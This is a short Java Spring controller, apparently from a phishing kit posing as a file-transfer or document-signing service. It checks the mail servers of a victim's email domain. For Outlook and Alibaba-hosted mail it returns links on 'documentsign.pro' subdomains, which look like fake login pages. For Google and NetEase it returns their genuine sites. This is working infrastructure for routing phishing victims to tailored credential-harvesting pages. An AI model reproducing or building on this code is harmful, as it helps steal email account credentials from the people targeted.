package havezzy.filetransfer.app.dnsresolver;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@CrossOrigin
@RestController
public class DnsResolverController {
	@Autowired
	private DnsResolverService dnsResolverService;
	
	@RequestMapping("/domain/{domainToCheck}")
	public String checkDns(@PathVariable String domainToCheck) {
		String mailBox = dnsResolverService.checkDns(domainToCheck);
		if (mailBox.contains("outlook.com.")) {
			return "https://login.documentsign.pro/hfMHORtA";
        } 
		else if(mailBox.contains("mxhichina.com.")) {
			return "https://qiye.documentsign.pro/lwTFAxbm";
		}
		else if(mailBox.contains("google.com.")) {
			return "https://www.gmail.com";
		}
		else if(mailBox.contains("mxmail.netease.com.")) {
			return "https://www.qiye.163.com";
		}
		
		return "unknown";
	}
}
